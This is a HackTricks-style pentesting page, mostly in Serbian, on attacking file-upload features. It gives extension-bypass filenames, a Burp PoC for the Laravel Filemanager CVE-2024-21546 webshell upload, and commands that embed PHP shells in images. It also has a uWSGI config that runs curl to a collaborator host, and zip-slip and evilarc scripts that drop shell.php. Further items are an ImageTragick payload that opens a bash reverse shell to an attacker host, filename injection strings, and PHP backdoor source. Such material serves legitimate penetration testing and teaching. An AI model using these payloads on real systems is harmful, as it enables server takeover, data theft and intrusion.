# Otpremanje fajlova

{{#include ../../banners/hacktricks-training.md}}

## Opšta metodologija za otpremanje fajlova

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Zaobilaženje provere ekstenzija fajlova

1. Ako se primenjuje, **proveri** **prethodne ekstenzije.** Takođe testiraj koristeći neka **velika slova**: _pHp, .pHP5, .PhAr ..._
2. _Proveri **dodavanje validne ekstenzije pre** eksekutivne ekstenzije (koristi i prethodne ekstenzije):_
- _file.png.php_
- _file.png.Php5_
3. Pokušaj dodati **specijalne karaktere na kraju.** Možeš koristiti Burp da **bruteforce** sve **ascii** i **Unicode** karaktere. (_Imaj na umu da možeš takođe pokušati da koristiš **ranije** pomenute **ekstenzije**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Pokušaj zaobići zaštite **zavaravanjem parsera ekstenzija** na server strani tehnikama kao što su **udvostručavanje** **ekstenzije** ili **dodavanje junk** podataka (**null** bajtovi) između ekstenzija. _Možeš takođe koristiti **prethodne ekstenzije** da pripremiš bolji payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Dodaj **još jedan sloj ekstenzija** na prethodnu proveru:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Pokušaj staviti **exec ekstenziju pre validne ekstenzije** i nadaj se da je server pogrešno konfigurisan. (korisno za eksploatisanje Apache misconfig-a gde će sve što ima ekstenziju **.php**, ali **ne mora nužno da se završava sa .php**, izvršavati kod):
- _ex: file.php.png_
7. Korišćenje NTFS alternate data stream (ADS) na Windows-u. U tom slučaju, karakter dvojne tačke ":" će biti ubačen posle zabranjene ekstenzije i pre dozvoljene. Kao rezultat, biće kreiran **prazan fajl sa zabranjenom ekstenzijom** na serveru (npr. "file.asax:.jpg”). Ovaj fajl može kasnije biti izmenjen koristeći druge tehnike kao što je korišćenje njegovog short filename-a. Pattern "**::$data**” takođe može biti korišćen za kreiranje ne-praznih fajlova. Stoga, dodavanje tačke posle ovog pattern-a može biti korisno za zaobilaženje daljih ograničenja (npr. "file.asp::$data.”)
8. Pokušaj probiti ograničenja dužine imena fajla. Validna ekstenzija se odseca. I ostaje maliciozni PHP. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. završna tačka) – CVE-2024-21546

Neki upload handler-i trieju ili normalizuju završne tačke iz sačuvanog imena fajla. U UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) verzijama pre 2.9.1, možeš zaobići validaciju ekstenzija tako što:

- Koristiš validan image MIME i magic header (npr. PNG’s `\x89PNG\r\n\x1a\n`).
- Imenovanjem otpremljenog fajla sa PHP ekstenzijom praćenom tačkom, npr. `shell.php.`.
- Server uklanja završnu tačku i sačuva `shell.php`, koji će se izvršiti ako je postavljen u web-serviran direktorijum (podrazumevano public storage kao `/storage/files/`).

Minimalni PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Zatim pristupite sačuvanoj putanji (tipično u Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Ažurirajte unisharp/laravel-filemanager na ≥ 2.9.1.
- Primeni stroge server-side allowliste i ponovo validiraj sačuvano ime fajla.
- Poslužuj uploadovane fajlove iz neizvršnih lokacija.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Zaobiđite **Content-Type** provere postavljanjem **value** polja **Content-Type** **header**-a na: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Zaobiđite **magic number** proveru dodavanjem na početak fajla **bytes of a real image** (zbunite _file_ komandu). Ili ubacite shell u **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ili takođe možete **ubaciti payload direktno** u sliku:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Ako se na vašu sliku primenjuje **kompresija**, na primer koristeći neke standardne PHP biblioteke kao što je [PHP-GD](https://www.php.net/manual/fr/book.image.php), prethodne tehnike neće biti korisne. Međutim, možete koristiti **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Veb stranica takođe može **resizovati** **sliku**, koristeći na primer PHP-GD funkcije `imagecopyresized` ili `imagecopyresampled`. Ipak, možete koristiti **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Još jedna tehnika za kreiranje payload-a koji **preživi promenu veličine slike**, koristeći PHP-GD funkciju `thumbnailImage`. Ipak, možete koristiti **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Pronađi ranjivost koja omogućava **rename** već uploadovanog fajla (promenu ekstenzije).
- Pronađi **Local File Inclusion** ranjivost da izvršiš backdoor.
- **Possible Information disclosure**:
1. Uploaduj **više puta** (i **istovremeno**) **isti fajl** sa **istim imenom**
2. Uploaduj fajl sa **imenom** fajla ili foldera koji **već postoji**
3. Upload fajla sa imenom **"."**, **".."**, ili **"…"**. Na primer, u Apache na **Windows**, ako aplikacija čuva uploadovane fajlove u "/www/uploads/" direktorijumu, ime fajla "." će kreirati fajl pod imenom "uploads" u "/www/" direktorijumu.
4. Upload fajla koji možda nije lako obrisati, na primer **"...:.jpg"** na **NTFS**. (Windows)
5. Upload fajla na **Windows** sa **invalidnim karakterima** kao što su `|<>*?”` u imenu. (Windows)
6. Upload fajla na **Windows** koristeći **rezervisane** (**forbidden**) **nazive** kao što su CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, i LPT9.
- Probajte i da **uploadujete izvršni fajl** (.exe) ili **.html** (manje sumnjivo) koji će **izvršiti kod** kada ga žrtva slučajno otvori.

### Special extension tricks

Ako pokušavate da uploadujete fajlove na **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Ako pokušavate da uploadujete fajlove na **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` fajlovi su kao `.jar` za java, ali za php, i mogu biti **used like a php file** (izvršavanje sa php, ili uključivanje u skriptu...).

Ekstenzija `.inc` se ponekad koristi za php fajlove koji služe samo za **import files**, tako da je moguće da je neko dozvolio **this extension to be executed**.

## **Jetty RCE**

Ako možete da uploadujete XML fajl u Jetty server možete dobiti [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Dakle, kao što je pomenuto na sledećoj slici, uploadujte XML fajl u `$JETTY_BASE/webapps/` i očekujte shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) ranjivosti mogu biti iskorišćene na uWSGI serverima ako postoji mogućnost da se izmeni `.ini` configuration file. uWSGI configuration files koriste specifičnu sintaksu za uključivanje "magic" varijabli, placeholder-a i operatora. Konkretno, '@' operator, korišćen kao `@(filename)`, služi za uključivanje sadržaja fajla. Među različitim podržanim schemes u uWSGI, "exec" scheme je posebno moćan, omogućavajući čitanje podataka iz standardnog izlaza procesa. Ova funkcionalnost se može manipulisati za zlonamerne svrhe kao što su Remote Command Execution ili Arbitrary File Write/Read kada se `.ini` configuration file procesira.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Izvršavanje payload-a se dešava tokom parsiranja konfiguracione datoteke. Da bi konfiguracija bila aktivirana i parsirana, uWSGI proces mora biti restartovan (potencijalno nakon pada ili usled Denial of Service napada) ili datoteka mora biti podešena da se auto-reload-uje. Auto-reload funkcija, ako je omogućena, ponovo učitava datoteku u zadatim intervalima pri detekciji izmena.

Ključno je razumeti popustljivost uWSGI parsiranja konfiguracione datoteke. Konkretno, pomenuti payload može biti ubačen u binarnu datoteku (na primer u sliku ili PDF), čime se dodatno širi opseg potencijalne eksploatacije.

## **wget File Upload/SSRF Trick**

U nekim slučajevima možete otkriti da server koristi **`wget`** za **preuzimanje fajlova** i da možete **navesti** **URL**. U tim slučajevima kod može proveravati da je ekstenzija preuzetih fajlova u okviru **whitelist** kako bi se osiguralo da će biti preuzeti samo dozvoljeni fajlovi. Međutim, **ova provera se može zaobići.**\  
The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"\*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) је моћан алат осмишљен да помогне Pentesters и Bug Hunters при тестирању механизама за upload фајлова. Он користи разне bug bounty технике да поједностави процес идентификације и експлоатисања ранљивости, обезбеђујући темељне процене web апликација.

### Corrupting upload indices with snprintf quirks (historical)

Неки legacy upload handler-и који користе `snprintf()` или слично за прављење multi-file низова из једног upload-а могу бити преварени да фалсификују `_FILES` структуру. Због неусклађености и скраћивања у понашању `snprintf()`, пажљиво састављен single upload може изгледати као више индексираних фајлова на serverskoj страни, збуњујући логику која претпоставља строгу форму (нпр. третирање као multi-file upload и улажење у небезбедне гране). Иако данас нишан, овај образац “index corruption” повремено се појављује у CTF-овима и старијим код базама.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagemagick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Pogledajte [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) za ostale tipove fajlova.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload-ujte arhivu koja sadrži soft linkove ka drugim fajlovima, zatim pristupom dekompresovanim fajlovima приступићете повезаним фајловима:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekompresija u različite foldere

Neočekivano kreiranje fajlova u direktorijumima tokom dekompresije predstavlja ozbiljan problem. Iako se prvobitno pretpostavljalo da ova konfiguracija može da zaštiti od OS-level command execution putem malicious file uploads, podrška za hijerarhijsku kompresiju i directory traversal u ZIP archive format može biti iskorišćena. To omogućava napadačima da zaobiđu ograničenja i escape secure upload directories manipulisanjem decompression functionality ciljne aplikacije.

Automatizovani exploit za kreiranje takvih fajlova dostupan je na [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Alat se može koristiti na sledeći način:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Pored toga, opcija je i **symlink trick with evilarc**. Ako je cilj да се циља фајл као што је `/flag.txt`, треба креирати symlink ка том фајлу у вашем систему. Ово осигурава да evilarc не наиђе на грешке током свог рада.

Ispod je primer Python koda koji se koristi за креирање злонамерног zip фајла:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Zloupotreba kompresije za file spraying**

Za više detalja **pogledajte originalni post na**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP kod koji izvršava komande prosleđene kroz varijablu `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Kreira se više fajlova i sastavlja se zip arhiva koja sadrži te fajlove.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Imena fajlova unutar zip-a se menjaju koristeći vi ili hex editor, zamenjujući "xxA" sa "../" kako bi se izvršilo traversiranje direktorijuma.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Otpremite ovaj sadržaj sa ekstenzijom slike da biste iskoristili ranjivost **(ImageMagick , 7.0.1-1)** (prema [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Ugrađivanje PHP shell-a u PNG

Ugrađivanje PHP shell-a u IDAT chunk PNG fajla može efikasno zaobići određene operacije obrade slike. Funkcije `imagecopyresized` i `imagecopyresampled` iz PHP-GD su posebno relevantne u ovom kontekstu, jer se obično koriste za promenu veličine i resampling slika, respektivno. Mogućnost da ugrađeni PHP shell ostane nepromenjen nakon ovih operacija predstavlja značajnu prednost za određene slučajeve upotrebe.

Detaljno istraživanje ove tehnike, uključujući metodologiju i potencijalne primene, dostupno je u sledećem članku: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ovaj resurs pruža sveobuhvatno razumevanje procesa i njegovih implikacija.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot fajlovi

Polyglot fajlovi služe kao jedinstven alat u sajberbezbednosti, ponašajući se kao kameleoni koji mogu validno postojati u više formata fajlova istovremeno. Zanimljiv primer je [GIFAR](https://en.wikipedia.org/wiki/Gifar), hibrid koji funkcioniše i kao GIF i kao RAR arhiva. Takvi fajlovi nisu ograničeni na ovu kombinaciju; moguće su i kombinacije kao GIF i JS ili PPT i JS.

Osnovna korisnost polyglot fajlova leži u njihovoj sposobnosti da zaobiđu sigurnosne mere koje pregledaju fajlove po tipu. Uobičajena praksa u raznim aplikacijama podrazumeva dozvoljavanje samo određenih tipova fajlova za upload — kao JPEG, GIF ili DOC — kako bi se smanjio rizik koji predstavljaju potencijalno opasni formati (npr. JS, PHP ili Phar fajlovi). Međutim, polyglot, time što zadovoljava strukturne kriterijume više formata, može tiho zaobići ova ograničenja.

Uprkos svojoj prilagodljivosti, polyglot-i imaju ograničenja. Na primer, iako polyglot može istovremeno predstavljati PHAR fajl i JPEG, uspeh njegovog otpremanja može zavisiti od politike ekstenzija na platformi. Ako je sistem strogo ograničen u pogledu dozvoljenih ekstenzija, sama strukturna dvojnost polyglota možda neće biti dovoljna da obezbedi upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Otpremanje validnih JSON fajlova kao da su PDF

Kako izbeći detekciju tipa fajla otpremanjem validnog JSON fajla čak i ako nije dozvoljeno, falsifikujući ga kao PDF (tehnike iz **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Sve dok su `%PDF` magic bajtovi u prvih 1024 bajta, smatra se validnim (pogledaj primer u postu)
- **`pdflib` library**: Ubaci lažni PDF format unutar polja u JSON-u tako da biblioteka misli da je pdf (pogledaj primer u postu)
- **`file` binary**: Može da pročita do 1048576 bajta iz fajla. Jednostavno kreiraj JSON veći od toga tako da ne može parsirati sadržaj kao json, a zatim unutar JSON-a stavi početni deo pravog PDF-a i on će pomisliti da je PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
